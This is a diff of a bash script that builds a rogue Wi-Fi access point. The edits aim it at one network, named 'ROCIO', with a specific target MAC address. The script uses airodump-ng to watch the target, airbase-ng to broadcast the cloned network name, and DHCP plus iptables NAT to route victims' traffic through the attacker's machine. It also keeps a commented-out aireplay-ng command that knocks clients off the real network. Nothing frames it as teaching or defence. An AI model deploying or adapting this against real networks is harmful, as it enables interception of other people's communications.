@@ -10,25 +10,26 @@
 
 ##variables
 
-IP="192.168.2.0" #$1
-MASK="255.255.255.0" #$2
+IP="192.168.2.128" #$1
+MASK="255.255.255.128" #$2
 
 ##IP Config
-ROUTER="$(echo ${IP} |  sed 's/.0$/.1/')"
-BROADCAST="$(echo ${IP} |  sed 's/.0$/.255/')"
+ROUTER="192.168.2.129"
+BROADCAST="192.168.2.255"
 SUBNET_MASK="${MASK}"
-DNS="192.168.2.1"
+DNS="192.168.1.1"
 INTERFACE='at0'
 
 ##WLAN Config
 CHANNEL=11
+BSSID_TARGET="D8:FB:5E:E8:5C:7F"
 BSSID="AA:AA:AA:AA:AA:AA"
-ESSID="FREE WIFI"
+ESSID="ROCIO"
 INTERFACE_MONITOR="wlx00c0ca3ebe53" #$3
 
 #RANGE
-INIT_IP="$(echo ${IP} |  sed 's/.0$/.40/')"
-END_IP="$(echo ${IP} |  sed 's/.0$/.100/')"
+INIT_IP="192.168.2.130"
+END_IP="192.168.2.140"
 
 ##SCREEN OPTIONS
 SCREEN_NAME_AIRBASE="wlan_screen"
@@ -119,23 +120,44 @@ authoritative;
 default-lease-time 600;
 max-lease-time 7200;
 subnet ${IP} netmask ${MASK} {
-	option routers ${ROUTER};
-	option broadcast-address ${BROADCAST};
 	option subnet-mask ${SUBNET_MASK};
-	option domain-name-servers ${DNS};
+	option broadcast-address ${BROADCAST};
+	option routers ${ROUTER};
+	option domain-name-servers 8.8.8.8;
 	range ${INIT_IP} ${END_IP};
 }"
 
+log_ok "Mode Monitor"
+ifconfig ${INTERFACE_MONITOR} down & iwconfig ${INTERFACE_MONITOR} mode monitor & ifconfig ${INTERFACE_MONITOR} up
+
+
+rm -rf "/tmp/woolan"
+mkdir "/tmp/woolan/"
+
 echo "$config_dhcpd" > /etc/dhcp/dhcpd.conf
+
+
+xterm +j -sb -rightbar -T "Targets" -bg blue -geometry 93x28+0+0  -e bash -c "airodump-ng  ${INTERFACE_MONITOR} -w /tmp/woolan/networks.lst" > /dev/null 2>&1 &
+
 
 ##start airbase on screen
 sleep 2
 log_ok "[-] Creating airbase screen..."
 rm -rf /var/run/dhcpd.pid &&
-screen -d -m -S ${SCREEN_NAME_AIRBASE} bash -c "airbase-ng -a ${BSSID} -e \"${ESSID}\" -c ${CHANNEL} ${INTERFACE_MONITOR}"
-sleep 2
+#screen -d -m -S ${SCREEN_NAME_AIRBASE} 
+sleep 1
+xterm -geometry 93x28+1200+0 -T "Network Stations" -e bash -c "airodump-ng ${INTERFACE_MONITOR} --bssid ${BSSID} --channel ${CHANNEL}" &
+xterm -geometry 93x28+1200+400 -T "Target Stations" -e bash -c "airodump-ng ${INTERFACE_MONITOR} --bssid ${BSSID_TARGET} --channel ${CHANNEL}" &
+sleep 1
+xterm -geometry 93x28+600+0 -e bash -c "airbase-ng  -I 100 -P -e \"${ESSID}\" -c ${CHANNEL} ${INTERFACE_MONITOR}" &
+sleep 4
+
+#deauth#
+#xterm -geometry 93x28+0+400 -e bash -c "aireplay-ng -0 0 -a ${BSSID_TARGET}  ${INTERFACE_MONITOR}" &
+
 log_ok "[-] Creating DHCP screen..."
-screen -d -m -S ${SCREEN_NAME_DHCP} bash -c "/etc/init.d/isc-dhcp-server restart"
+#screen -d -m -S ${SCREEN_NAME_DHCP} 
+xterm -e bash -c "/etc/init.d/isc-dhcp-server restart" &
 
 
 echo "INTERFACESv4='${INTERFACE}'" > /etc/default/isc-dhcp-server 
@@ -145,11 +167,9 @@ ifconfig ${INTERFACE} up
 ifconfig ${INTERFACE} mtu 1400
 ifconfig ${INTERFACE} ${ROUTER} netmask ${MASK}
 
-echo 1 > /proc/sys/net/ipv4/ip_forward
 
 ##add route
 route add -net ${IP} netmask ${MASK} gw ${ROUTER}
-sysctl -w net.ipv4.ip_forward=1 &> /dev/null
 
 iptables --flush
 iptables --table nat --flush
@@ -157,16 +177,19 @@ iptables --delete-chain
 iptables --table nat --delete-chain
 iptables -P FORWARD ACCEPT
 iptables -t nat -A POSTROUTING -j MASQUERADE
-iptables -t nat -A PREROUTING -p udp -j DNAT --to 192.168.1.1
 iptables --table nat --append POSTROUTING --out-interface wlp4s0 -j MASQUERADE
 iptables --append FORWARD --in-interface ${INTERFACE} -j ACCEPT
+iptables-save
+
+echo 1 > /proc/sys/net/ipv4/ip_forward
+
+sysctl -w net.ipv4.ip_forward=1 &> /dev/null
+
 
 echo -e "\n"
 log_ok "WLAN ${ESSID} creado"
 echo -e "\n"
-exit;
 
 
 
-
-
+cat
